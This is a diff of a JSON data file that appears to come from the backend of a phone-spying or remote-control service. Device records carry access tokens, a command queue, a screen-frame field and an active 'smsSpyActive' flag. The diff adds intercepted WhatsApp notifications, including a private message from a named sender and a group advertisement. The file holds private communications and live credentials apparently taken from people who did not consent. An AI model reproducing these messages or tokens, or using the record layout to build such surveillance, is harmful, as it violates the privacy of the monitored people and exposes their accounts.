@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776765348593,
+    "lastSeen": 1776765360064,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Kelvin",
+        "content": "Ada kgk?",
+        "time": "21/04 17:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776765360826
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4123,6 +4131,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (845 pesan): ~ IKYY STORE",
+        "content": "JASTEB BY IKYY STORE🔥🔥\n\n2K : 30RESS\n5K : 60RESS\n7K : 99RESS                  \n10K : 150RESS\n15K : 200RESS           JEBOLIN VDA : 5K\n\nNOTE :\nJASTEB TUH HOKI-HOKIAN JADI JIKA TIDAK DAPAT APA APA JANGAN KOAR KOAR😉",
+        "time": "21/04 16:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776765349983
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎4202 pesan dari 23 chat",
         "time": "21/04 16:55",
@@ -4498,7 +4514,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776765347224,
+    "lastSeen": 1776765359503,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
